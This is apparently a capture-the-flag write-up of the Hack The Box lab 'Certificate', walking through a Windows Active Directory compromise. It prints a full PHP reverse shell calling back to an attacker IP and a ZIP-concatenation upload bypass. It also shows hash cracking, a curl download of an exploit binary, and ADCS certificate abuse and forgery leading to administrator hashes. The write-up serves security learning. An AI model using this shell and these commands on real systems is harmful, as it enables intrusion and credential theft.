
# HTB Certificate - Writeup

**Platform:** Windows  
**IP:** 10.10.11.71  
**Difficulty:** Hard  
**Author:** NoSec

---

## Recon

```text
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Apache httpd 2.4.58 (OpenSSL/3.1.3 PHP/8.0.30)
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: certificate.htb)
445/tcp  open  microsoft-ds
464/tcp  open  kpasswd5
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: certificate.htb)
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: certificate.htb)
3269/tcp open  ssl/ldap
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0
Service Info: Host: DC01; OS: Windows
```

### Clock-skew

- Time synchronization is required for Kerberos!
```bash
sudo rdate -n certificate.htb
```

---

## Web Exploitation – RCE via Upload

You can register on the site and click “Enroll” on any course to get a URL like:
```
http://certificate.htb/upload.php?s_id=36
```

It only allows uploading PDF and ZIP files.  
I used a ZIP concatenation trick so that the actual PHP shell is appended at the end while keeping a valid ZIP structure.

### Steps

1. Create a PHP reverse shell (`shell.php`)
   
 ```php
<?php
// php-reverse-shell - A Reverse Shell implementation in PHP. Comments stripped to slim it down. RE: https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
// Copyright (C) 2007 pentestmonkey@pentestmonkey.net

set_time_limit (0);
$VERSION = "1.0";
$ip = '10.10.14.8';
$port = 4444;
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; powershell -i';
$daemon = 0;
$debug = 0;

if (function_exists('pcntl_fork')) {
	$pid = pcntl_fork();
	
	if ($pid == -1) {
		printit("ERROR: Can't fork");
		exit(1);
	}
	
	if ($pid) {
		exit(0);  // Parent exits
	}
	if (posix_setsid() == -1) {
		printit("Error: Can't setsid()");
		exit(1);
	}

	$daemon = 1;
} else {
	printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
}

chdir("/");

umask(0);

// Open reverse connection
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
	printit("$errstr ($errno)");
	exit(1);
}

$descriptorspec = array(
   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
   2 => array("pipe", "w")   // stderr is a pipe that the child will write to
);

$process = proc_open($shell, $descriptorspec, $pipes);

if (!is_resource($process)) {
	printit("ERROR: Can't spawn shell");
	exit(1);
}

stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

printit("Successfully opened reverse shell to $ip:$port");

while (1) {
	if (feof($sock)) {
		printit("ERROR: Shell connection terminated");
		break;
	}

	if (feof($pipes[1])) {
		printit("ERROR: Shell process terminated");
		break;
	}

	$read_a = array($sock, $pipes[1], $pipes[2]);
	$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

	if (in_array($sock, $read_a)) {
		if ($debug) printit("SOCK READ");
		$input = fread($sock, $chunk_size);
		if ($debug) printit("SOCK: $input");
		fwrite($pipes[0], $input);
	}

	if (in_array($pipes[1], $read_a)) {
		if ($debug) printit("STDOUT READ");
		$input = fread($pipes[1], $chunk_size);
		if ($debug) printit("STDOUT: $input");
		fwrite($sock, $input);
	}

	if (in_array($pipes[2], $read_a)) {
		if ($debug) printit("STDERR READ");
		$input = fread($pipes[2], $chunk_size);
		if ($debug) printit("STDERR: $input");
		fwrite($sock, $input);
	}
}

fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);

function printit ($string) {
	if (!$daemon) {
		print "$string\n";
	}
}

?>
```

3. Create an empty PDF (e.g. `test.pdf`)  
4. Merge ZIPs:
```bash
zip head.zip test.pdf
zip -r tail.zip nosechere   # nosechere/shell.php
cat head.zip tail.zip > main.zip
```
4. Upload `main.zip`  
5. Browse to:
```
http://certificate.htb/static/uploads/[...]/nosechere/shell.php
```
6. Netcat listener:
```bash
nc -lvnp 4444
```

Initial shell user: `xamppuser`

---

## Database Enumeration & Access

```cmd
.\mysql.exe -u certificate_webapp_user -p"cert!f!c@teDBPWD" -e "use certificate_webapp_db; select * from users;" -E
```

- **Username:** `sara.b`
- **Bcrypt Hash:** `$2y$04$CgDe/...`

### Cracking

```bash
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

→ **Password:** `Bl******`

### WinRM

```bash
evil-winrm -i 10.10.11.71 -u Sara.B -p 'Bl******'
```

⚠️ **Note:** HTB patched the password reset trick on June 10, 2025!

---

## PCAP Analysis – Kerberos Hash Extraction

```bash
python krb5_roast_parser.py WS-01_PktMon.pcap as_req >> hash.txt
```

### Hashcat Crack

```bash
hashcat -m 19900 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
```

→ **Password:** `!QA*****`

---

## Certipy – PFX Requests

### Lion.SK

```bash
certipy req -u 'lion.sk@CERTIFICATE.HTB' -p "\!QA<pass>" -dc-ip '10.10.11.71' -target 'DC01.CERTIFICATE.HTB' -ca 'Certificate-LTD-CA' -template 'Delegated-CRA'
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 24
[*] Got certificate with UPN 'Lion.SK@certificate.htb'
[*] Certificate object SID is 'S-1-5-21-515537669-4223687196-3249690583-1115'
[*] Saved certificate and private key to 'lion.sk.pfx'
```

### Ryan.K

```bash
certipy req -u 'lion.sk@CERTIFICATE.HTB' -p "\!QA<pass>" -dc-ip '10.10.11.71' -target 'DC01.CERTIFICATE.HTB' -ca 'Certificate-LTD-CA' -template 'SignedUser' -pfx 'lion.sk.pfx' -on-behalf-of 'CERTIFICATE\ryan.k'
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 25
[*] Got certificate with UPN 'ryan.k@certificate.htb'
[*] Certificate object SID is 'S-1-5-21-515537669-4223687196-3249690583-1117'
[*] Saved certificate and private key to 'ryan.k.pfx'
```

### NTLM hash dump

```bash
certipy auth -pfx 'ryan.k.pfx' -dc-ip '10.10.11.71'
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Using principal: ryan.k@certificate.htb
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'ryan.k.ccache'
[*] Trying to retrieve NT hash for 'ryan.k'
[*] Got hash for 'ryan.k@certificate.htb': aad3b435b51404eea<hash>
```
### WinRM:

```bash
evil-winrm -i 10.10.11.71 -u ryan.k -H [ryan.k_hash]
```

## Privilege Escalation

```powershell
whoami /priv
# SeManageVolumePrivilege
```

Exploit:
```powershell
curl 10.10.14.8/SeManageVolumeExploit.exe -O ...
.\SeManageVolumeExploit.exe
```

Test:
```powershell
echo "test" > C:\Windows\test.txt
type C:\Windows\test.txt
```

---

## Export CA

```powershell
mkdir /temp
certutil -exportPFX my "Certificate-LTD-CA" C:temp\ca.pfx
```

## Download CA

```powershell
download ca.pfx
```
## Admin PFX forge

```bash
certipy forge -ca-pfx ca.pfx -upn 'administrator@certificate.htb' -out forged_admin.pfx
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Saved forged certificate and private key to 'forged_admin.pfx'
```

## Admin NTLM hash dump

```bash
certipy auth -dc-ip '10.10.11.71' -pfx 'forged_admin.pfx' -username 'administrator' -domain 'certificate.htb'
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Using principal: administrator@certificate.htb
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@certificate.htb': aad3b435b51404eeaad<hash>
```

## Root / Administrator Access

```bash
evil-winrm -i 10.10.11.71 -u administrator -H d80430...
```

→ `root.txt` captured ✅

---

## 🧠 Notes & Reflections – What I learned from this box

- Full AD attack chain
- ZIP concat trick
- ADCS/PKI abuse
- Kerberoasting from PCAP
- Shadow Credentials
- Certificate forging

---

## ⚠️ Mistakes, Pitfalls & Tips

- Time sync is a must!
- Password reset was patched (June 10, 2025)

---

## ✅ Summary

*Certificate* is an excellent ADCS compromise lab.  
Recommended for anyone getting into Red/Blue Teaming, PKI abuse, and modern AD attacks.

Feel free to reach out if you have questions!
